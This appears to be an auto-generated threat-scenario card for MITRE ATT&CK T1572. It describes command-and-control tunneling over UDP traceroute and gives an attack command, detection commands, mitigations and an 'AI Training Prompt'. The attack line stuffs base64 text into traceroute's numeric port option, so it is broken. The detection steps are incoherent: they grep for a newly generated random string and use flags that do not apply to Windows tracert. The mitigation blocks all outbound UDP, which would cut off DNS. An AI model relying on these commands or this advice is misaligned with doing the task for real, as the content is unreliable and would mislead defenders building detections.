---
type: campaign
scenario_id: 437
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using traceroute with UDP for C2 tunneling.

## Threat Description
Using traceroute with UDP for C2 tunneling.

## Attack Command
```
traceroute -U $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -q 1 -w 1 -m 10 -p $(echo c2cmd | base64 -w0)
```

## Detection Logic
Monitor traceroute UDP: `wmic process where name='tracert.exe' get commandline | findstr -U`; Anomalous UDP traffic: `tshark -Y 'udp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict traceroute: `icacls %windir%\System32\tracert.exe /deny Everyone:RX`; Block UDP: `netsh advfirewall firewall add rule name='Block UDP' dir=out action=block protocol=UDP`.

## AI Training Prompt
Train AI to detect UDP-based C2 tunneling via traceroute by analyzing packet patterns, base64-encoded data, and UDP traffic anomalies; suggest UDP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
